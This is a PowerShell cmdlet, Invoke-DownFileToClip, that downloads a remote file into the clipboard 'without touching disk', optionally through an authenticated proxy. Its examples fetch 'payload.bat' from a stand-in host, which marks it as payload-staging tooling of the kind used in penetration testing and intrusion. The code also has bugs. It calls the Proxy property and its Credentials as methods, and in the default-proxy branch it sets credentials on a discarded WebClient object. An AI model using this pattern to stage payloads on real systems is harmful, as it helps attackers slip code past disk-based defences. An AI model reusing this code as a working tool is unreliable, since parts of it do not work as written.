Function Invoke-DownFileToClip
{
    <#
            .Synopsis
            Retrieve a file from a remote Server and place in clipboard

            .Description
            This cmdlet will take a URL of a file, download the file from the remote server and place the file in the clipboard for future use, without touching disk. The cmdlet also
            Provides support for proxies both default and custom.

            .Parameter remoteurl
            URL of the remote file.

            .Parameter defaultproxy
            Use the default system configurted proxy, this is a switch parameter and does not require a value to be set.

            .Parameter customproxy
            Provide the cmdlet with a custom proxy ie http://192.168.0.1:8080.

            .Parameter username
            Provide the username for authentication to the custom proxy.

            .Parameter password
            Provide the assocaiated password for the custom proxy.

            Written by Dave Hardy, davehardy20@gmail.com @davehardy20

            Version 0.2

            .Example
            PS> Invoke-DownFileToClip -defaultproxy -remoteurl http://somedomain.com/payload.bat

            .Example
            PS> Invoke-DownFileToClip -customproxy http://192.168.0.1:8080 -username dave -password password -remoteurl http://somedomain.com/payload.bat

    #>

    [cmdletbinding(DefaultParameterSetName="set2")]
    Param
    (
        #Parameter set for custom proxy
        [Parameter(ParameterSetName='set1')] $customproxyurl,
        [Parameter(ParameterSetName='set1', Mandatory=$true)] $username,
        [Parameter(ParameterSetName='set1', Mandatory=$true)] $password,

        #Parameter set for default system proxy
        [Parameter(ParameterSetName='set2')][Switch] $defaultproxy,
        #Mandatory 
        [Parameter(Mandatory=$true, Position = 0)] $remoteurl

    )
    #webclient variables
    $web = New-Object -TypeName System.Net.WebClient
    $web.UseDefaultCredentials = $true
    $Command = '' #This is the variable to store the downloaded file

    if ($PSCmdlet.ParameterSetName -eq 'set2')
    {
    (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    }
    ElseIf ($PSCmdlet.ParameterSetName -eq 'set1')
    {
    $PSS = ConvertTo-SecureString $password -AsPlainText -Force
    $SecureCreds = new-object system.management.automation.PSCredential $username,$PSS 
    $web.Proxy($customproxyurl)
    $web.Proxy.Credentials($SecureCreds)
    }

    #Download the file
    $Command = $web.DownloadString($remoteurl)
    #Put the download file onto the clipboard.
    $null = [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
    [Windows.Forms.Clipboard]::SetText($Command)
}
